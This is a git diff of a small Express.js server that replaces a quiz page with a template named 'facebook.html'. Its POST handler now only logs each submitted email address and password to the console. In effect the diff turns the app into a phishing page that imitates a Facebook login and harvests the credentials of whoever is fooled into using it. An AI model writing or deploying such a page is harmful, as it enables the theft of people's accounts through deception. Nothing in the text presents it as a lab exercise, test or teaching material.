@@ -5,37 +5,16 @@ var app = express();
 app.use(express.urlencoded({ extended: false }));
 
 app.get("/", (req, res) => {
-  res.sendFile(__dirname + "/templates/index.html");
-
-  //   res.send(`
-  //     <form action='/answer' method='POST'>
-  //     <p> what color is the sky on a clear and sunny day ? </p>
-  //     <input name="skyColor" autocomplete="off">
-  //     <button> Submit Answer <button>
-  //     </form>
-  //     `);
+  res.sendFile(__dirname + "/templates/facebook.html");
 });
 
-// app.get("/answer", (req, res) => {
-//   res.send("Thank you for submiting the form.");
-// });
-
 app.post("/answer", (req, res) => {
-  //   if (req.body.email === "BLUE") {
-
-  //     res.send(`
-
-  //         <p>Congrats, Your is the correct answer </p>
-  //         <a href='/'> Back To Home Page </a>
-  //         `);
-  //   } else {
-  //     res.send(`<p> Sorry Your Answer is Not Correct </p>
-  //       `);
-  //   }
   console.log("Email:", req.body.email);
   console.log("Password: ", req.body.password);
 });
 
-app.listen(3000, "0.0.0.0", () =>
-  console.log("Server listening on port 3000!")
-);
+app.listen(3000, "0.0.0.0", err => {
+  if (err) throw err;
+
+  console.log("Server listening on port 3000!");
+});
